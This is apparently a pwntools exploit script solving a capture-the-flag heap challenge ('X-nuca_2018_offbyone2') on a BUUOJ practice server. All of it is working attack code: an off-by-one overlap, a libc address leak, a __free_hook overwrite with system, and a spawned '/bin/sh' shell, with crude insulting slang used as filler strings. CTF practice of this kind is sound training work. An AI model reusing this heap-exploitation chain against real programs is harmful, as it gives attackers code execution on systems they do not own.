from pwn import *
r = remote('node3.buuoj.cn',28123)
#r = process('./X-nuca_2018_offbyone2')
elf = ELF('./X-nuca_2018_offbyone2')
libc = ELF('/libc-2.27.so')

def add(size,note):
    r.sendlineafter('>> ','1')
    r.sendlineafter('length: ',str(size))
    r.sendlineafter('note:',note)

def free(index):
    r.sendlineafter('>> ','2')
    r.sendlineafter('index: ',str(index))

def show(index):
    r.sendlineafter('>> ','3')
    r.sendlineafter('index: ',str(index))

for i in range(7):
	add(0xf0,'fuck')
add(0xf0,'fuck')
add(0x88,'nmsl')
add(0xf0,'fuck')
add(0xa0,'wdnmd')
for i in range(7):
	free(i)
free(7)
free(8)
add(0x88,'a'*0x80+p64(0x190))
free(9)
for i in range(7):
	add(0xf0,'fuck')
add(0xf0,'wdnmd')
show(0)
libc_base=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3ebca0
log.success(hex(libc_base))
system = libc_base+libc.sym['system']
free_hook=libc_base+libc.sym['__free_hook']
log.success(hex(free_hook))
add(0x88,'fuck')
free(9)
free(0)
add(0x88,p64(free_hook))
add(0x88,'/bin/sh\x00')
add(0x88,p64(system))
free(9)
r.interactive()
